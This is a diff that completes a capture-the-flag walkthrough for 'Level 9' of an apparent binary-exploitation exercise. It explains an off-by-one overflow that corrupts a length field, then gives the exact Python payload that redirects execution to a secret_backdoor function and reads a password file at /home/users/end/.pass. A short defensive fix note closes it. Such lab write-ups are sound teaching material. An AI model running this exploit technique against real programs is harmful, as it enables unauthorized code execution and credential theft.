@@ -2,18 +2,24 @@ Level 9 - Walkthrough
 ========================
 
 1) Recon
-- Files discovered:
-- Useful commands used:
+- Files discovered: `source`, `Ressources/script`, `flag`
+- Useful commands used: `ls`, `cat`, `objdump -d ./level09 | less`
 
 2) Vulnerability confirmation
-- What is vulnerable:
-- Why it is exploitable:
+- What is vulnerable: `set_username` copies up to 41 bytes into `username[40]`, overwriting `msg_len` in `message_ctx`.
+- Why it is exploitable: the corrupted `msg_len` is later used as the length for `strncpy` in `set_msg`, enabling a controlled overflow of `msg` into the saved return address and redirecting execution to `secret_backdoor`.
 
 3) Exploitation steps
 - Exact command sequence:
-- Payload used:
+	- `python - <<'PY' | ./level09`
+	- `u = 'a'*40 + '\xd4' + '\n'`
+	- `m = 'a'*200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n'`
+	- `c = 'cat /home/users/end/.pass\n'`
+	- `print(u + m + c)`
+	- `PY`
+- Payload used: username overflow to set `msg_len` to `0xd4`, then `msg` overflow with padding + `secret_backdoor` address (`0x55555555488c`, little-endian).
 
 4) Result
-- Retrieved next password from:
-- Notes for defense/evaluation:
+- Retrieved next password from: `/home/users/end/.pass` via `secret_backdoor` command execution.
+- Notes for defense/evaluation: fix the off-by-one in `set_username` and avoid using attacker-controlled lengths in `strncpy`.
 
